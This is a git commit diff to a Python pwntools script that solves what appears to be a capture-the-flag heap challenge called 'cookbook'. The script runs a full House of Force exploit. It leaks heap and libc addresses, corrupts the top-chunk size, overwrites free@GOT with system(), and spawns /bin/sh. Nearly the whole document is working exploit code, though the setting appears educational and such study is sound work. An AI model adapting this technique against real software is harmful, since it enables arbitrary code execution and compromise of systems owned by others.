b82c132715059085a67c3991051a9809e64a489f
Jonghyuk Song <jonghyk.song@gmail.com>
2017-05-22 23:33:18 +0900

    20170522

--- house_of_force_example/sol_cookbook.py
+++ house_of_force_example/sol_cookbook.py
@@ -2,15 +2,9 @@
 from pwn13 import *
 import ctypes
 
-
 free_got = 0x804d018
 
-def init():
-    print p.sendlineafter("?","freestar")
-    print p.recvuntil("t\n")
-
-def leak():
-    #heap addr leak
+def sol():
     p.sendline("a")
     print p.recvuntil("t)?\n")
     p.sendline("n")
@@ -18,12 +12,12 @@ def leak():
     p.sendline("d")
     print p.recvuntil("t)?\n")
     p.sendline("q")
-    print p.recvuntil("t\n")
+    print p.recvuntil("it\n")
     p.sendline("g")
     print p.recvuntil(": ")
     p.sendline("84")
     p.sendline("a"*4)
-    print p.recvuntil("t\n")
+    print p.recvuntil("it\n")
     p.sendline("a")
     print p.recvuntil("t)?\n")
     p.sendline("n")
@@ -31,39 +25,69 @@ def leak():
     p.sendline("l")
     print p.recvuntil("price: ")
     data = p.recvline()[:-1]
-    print hex(int(data))
+    top_chunk_addr = int(data) + 0x520
+    print 'top chunk', hex(top_chunk_addr)
 
     print p.recvuntil("t)?\n")
 
-    '''
+    p.sendline("q")
+    print p.recvuntil("it\n")
     p.sendline("c")
-    print p.recvuntil("t\n")
+    print p.recvuntil("it\n")
     p.sendline("n")
-    print p.recvuntil("t\n")
+    print p.recvuntil("it\n")
 
-    p.heap(0x1600, 0x100)
+    p.heap(0x1700, 0x300)
     p.sendline("i")
     payload = "A"*896
     payload += p32(0xffffffff)
     p.sendline(payload)
-    print p.recvuntil("t\n")
-    p.heap(0x1600, 0x100)
+    print p.recvuntil("it\n")
+
+    p.heap(0x1700, 0x300)
 
     p.sendline("q")
-    print p.recvuntil("t\n")
+    print p.recvuntil("it\n")
+
+    p.dump(0x0804d000, 0x200)
+
     p.sendline("g")
     print p.recvuntil(": ")
+    size = ctypes.c_uint32(free_got - 34 - top_chunk_addr).value
+    print 'size', str(hex(size))[2:]
+    p.sendline(str(hex(size))[2:])
+    p.sendline("AAAA")
+    print p.recvuntil("it\n")
 
-    #size = free_got - k
-    '''
+    p.dump(0x0804d000, 0x200)
+
+
+    p.sendline("a")
+    print p.recvuntil("t)?\n")
+    p.sendline("n")
+    print p.recvuntil("t)?\n")
+    p.sendline("l")
+    print p.recvuntil("price: ")
+    data = p.recvline()[:-1]
+    addr = ctypes.c_uint32(int(data)).value
+    print hex(addr)
+    libc_base = addr - 0x13da80
+    system_addr = libc_base + 0x3ada0
+    print 'libc_base', hex(libc_base)
+    print p.recvuntil("t)?\n")
+    p.dump(0x0804d000, 0x300)
+
+    p.sendline("g")
+    p.sendline(p32(system_addr)+";/bin/sh;")
+    p.interactive()
 
 
 
 if __name__ == "__main__":
     p = process("./cookbook")
+    print p.sendlineafter("?","freestar")
+    print p.recvuntil("t\n")
 
-    init()
-
-    leak()
+    sol()
 
     p.close()
